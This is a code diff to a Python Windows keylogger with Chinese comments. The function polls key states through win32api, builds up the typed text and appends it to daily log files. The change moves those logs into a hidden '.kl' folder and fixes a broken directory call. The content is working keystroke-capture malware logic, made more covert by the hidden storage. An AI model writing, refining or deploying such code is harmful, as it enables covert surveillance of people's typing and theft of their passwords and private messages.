@@ -99,14 +99,19 @@ def keylogger(save_dir):
     try:
         keys = getAllKeys()
         result = ''
+        # Make the keylogger dirs
+        save_dir = os.path.join(save_dir, '.kl')
+        if not os.path.exists(save_dir):
+            os.makedirs(save_dir)
+        
         while True:
             name = ''
             for code in [3] + list(range(8, 256)):
                 status = win32api.GetAsyncKeyState(code)
                 if status & 1 == 0:  # 檢查該按鍵是否被按過
                     continue
-                if keys.get(code) is None:
-                    continue # 忽略沒收錄的key
+                if keys.get(code) is None:  # 忽略沒收錄的key
+                    continue
                     
                 NumLock  = pressNumLock()
                 CapsLock = pressCapsLock()
@@ -134,8 +139,6 @@ def keylogger(save_dir):
                 if result:
                     fn = 'K' + time.strftime('%Y%m%d') + '.txt'
                     try:
-                        if not os.path.exists(save_dir):
-                            os.mkdirs(save_dir)
                         fullpath = os.path.join(save_dir, fn)
                         with open(fullpath, 'a') as fd:
                             fd.write(result)
@@ -151,6 +154,7 @@ def keylogger(save_dir):
         logging.error('Error: {}'.format(e.args))
 
 if __name__ == '__main__':
+    # DEBUG use
     """
     keys = getKeys()
     while True:
